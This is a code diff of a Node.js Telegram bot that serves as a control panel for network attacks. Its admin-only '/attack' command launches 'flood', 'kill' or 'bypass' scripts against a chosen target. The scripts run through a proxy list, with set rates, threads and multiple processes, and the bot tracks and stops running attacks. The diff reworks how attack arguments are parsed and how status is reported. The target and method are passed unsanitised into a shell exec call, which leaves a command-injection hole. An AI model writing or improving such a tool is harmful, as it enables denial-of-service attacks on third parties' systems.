@@ -15,11 +15,9 @@ app.get('/', (req, res) => {
   res.json({ telegramAdmin: '@xkprj' });
 });
 
-app.listen(port, () => {
-  console.log(`Server running on port ${port}`);
-});
+app.listen(port);
 
-bot.onText(/\/system/, async (msg) => {
+bot.onText(/^\/system$/, async (msg) => {
   if (msg.from.id.toString() !== adminId) {
     bot.sendMessage(msg.chat.id, 'Access denied');
     return;
@@ -32,25 +30,63 @@ bot.onText(/\/system/, async (msg) => {
   }
 });
 
-bot.onText(/\/attack\s+(\w+)\s+(\S+)\s+(\d+)(?:\s+--core\s+(\d+))?/, (msg, match) => {
+bot.onText(/^\/attack (.+)/, async (msg, match) => {
   if (msg.from.id.toString() !== adminId) {
     bot.sendMessage(msg.chat.id, 'Access denied');
     return;
   }
-  const method = ['flood', 'kill', 'bypass'].includes(match[1]) ? match[1] : 'flood';
-  const target = match[2];
-  const time = parseInt(match[3]);
-  const core = match[4] ? parseInt(match[4]) : 1;
+
+  const args = match[1].trim().split(/\s+/);
+  let method = 'flood';
+  let target = '';
+  let time = 0;
+  let core = 1;
+
+  const coreIndex = args.findIndex(arg => arg === '--core');
+  if (coreIndex !== -1 && args[coreIndex + 1]) {
+    core = parseInt(args[coreIndex + 1]);
+    args.splice(coreIndex, 2);
+  }
+
+  if (['flood', 'kill', 'bypass'].includes(args[0])) {
+    method = args[0];
+    target = args[1];
+    time = parseInt(args[2]);
+  } else {
+    target = args[0];
+    time = parseInt(args[1]);
+  }
+
+  if (!target || isNaN(time)) {
+    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time] --core [number]');
+    return;
+  }
+
   const rate = 25;
   const threads = 10;
   const proxyfile = './prx.txt';
-  
-  if (!target || !time) {
-    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time] [--core number]');
-    return;
-  }
-  
   const attackId = Date.now();
+  const pids = [];
+
+  const message = await bot.sendMessage(msg.chat.id, JSON.stringify({
+    status: 'started',
+    target,
+    time,
+    rate,
+    threads,
+    proxyfile,
+    core
+  }, null, 2));
+
+  for (let i = 0; i < core; i++) {
+    const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
+      if (err) {
+        bot.sendMessage(msg.chat.id, `Core ${i + 1} failed: ${err.message}`);
+      }
+    });
+    pids.push(child.pid);
+  }
+
   const attackData = {
     id: attackId,
     target,
@@ -58,68 +94,44 @@ bot.onText(/\/attack\s+(\w+)\s+(\S+)\s+(\d+)(?:\s+--core\s+(\d+))?/, (msg, match
     rate,
     threads,
     proxyfile,
-    status: 'started',
-    messageId: null,
-    pids: []
+    status: 'running',
+    messageId: message.message_id,
+    pids,
+    core
   };
-  
-  for (let i = 0; i < core; i++) {
-    const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
-      if (err) {
-        bot.sendMessage(msg.chat.id, `Attack ${attackId} failed: ${err.message}`);
-        attacks = attacks.filter(a => a.id !== attackId);
-      }
-    });
-    attackData.pids.push(child.pid);
-  }
-  
+
   attacks.push(attackData);
-  
-  bot.sendMessage(msg.chat.id, JSON.stringify({
-    status: attackData.status,
-    target,
-    time,
-    rate,
-    threads,
-    proxyfile,
-    cores: core
-  }, null, 2)).then(sentMsg => {
-    attackData.messageId = sentMsg.message_id;
-    
-    setTimeout(() => {
-      attackData.status = 'running';
-      let remainingTime = time;
-      const interval = setInterval(() => {
-        remainingTime -= 5;
-        if (remainingTime <= 0) {
-          clearInterval(interval);
-          bot.deleteMessage(msg.chat.id, attackData.messageId);
-          attacks = attacks.filter(a => a.id !== attackId);
-          return;
-        }
-        bot.editMessageText(JSON.stringify({
-          status: attackData.status,
-          target,
-          time: remainingTime,
-          rate,
-          threads,
-          proxyfile,
-          cores: core
-        }, null, 2), {
-          chat_id: msg.chat.id,
-          message_id: attackData.messageId
-        }).catch(() => {
-          clearInterval(interval);
-          attacks = attacks.filter(a => a.id !== attackId);
-        });
-      }, 5000);
-    }, 5000);
-  });
-  
+
+  let remainingTime = time;
+  const interval = setInterval(() => {
+    remainingTime -= 5;
+    if (remainingTime <= 0) {
+      clearInterval(interval);
+      bot.deleteMessage(msg.chat.id, attackData.messageId);
+      attacks = attacks.filter(a => a.id !== attackId);
+      return;
+    }
+    bot.editMessageText(JSON.stringify({
+      status: attackData.status,
+      target,
+      time: remainingTime,
+      rate,
+      threads,
+      proxyfile,
+      core
+    }, null, 2), {
+      chat_id: msg.chat.id,
+      message_id: attackData.messageId
+    }).catch(() => {
+      clearInterval(interval);
+      attacks = attacks.filter(a => a.id !== attackId);
+    });
+  }, 5000);
+
   bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`);
 });
 
-bot.onText(/\/list/, (msg) => {
+bot.onText(/^\/list$/, (msg) => {
   if (msg.from.id.toString() !== adminId) {
     bot.sendMessage(msg.chat.id, 'Access denied');
     return;
@@ -128,11 +140,11 @@ bot.onText(/\/list/, (msg) => {
     bot.sendMessage(msg.chat.id, 'No active attacks');
     return;
   }
-  const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s, Cores: ${a.pids.length}`).join('\n');
+  const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s, Core: ${a.core}`).join('\n');
   bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`);
 });
 
-bot.onText(/\/stop\s+(\d+)/, (msg, match) => {
+bot.onText(/^\/stop (\d+)/, (msg, match) => {
   if (msg.from.id.toString() !== adminId) {
     bot.sendMessage(msg.chat.id, 'Access denied');
     return;
